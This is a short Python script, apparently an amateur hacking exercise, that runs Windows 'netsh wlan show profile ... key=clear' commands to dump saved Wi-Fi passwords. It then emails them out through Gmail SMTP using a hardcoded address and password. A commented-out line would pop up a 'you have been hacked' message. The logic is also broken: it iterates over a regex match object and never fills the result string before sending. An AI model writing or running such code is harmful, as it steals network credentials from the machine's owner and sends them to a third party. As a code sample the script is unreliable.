#!/usr/bin/env python

import subprocess
import smtplib
import re

# command popup
# command = "msg * you have been hacked"
# subprocess.Popen(command, shell=True)


# command send_mail
def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile UPC723762 key=clear"
network = subprocess.check_output(command, shell=True)
network_name_list = re.search("(?:Profile\s*:\s)(.*)", network)

result = ""
for network_name in network_name_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)

send_mail("jhnwck70@gmail.com", "abc123abs12", result)
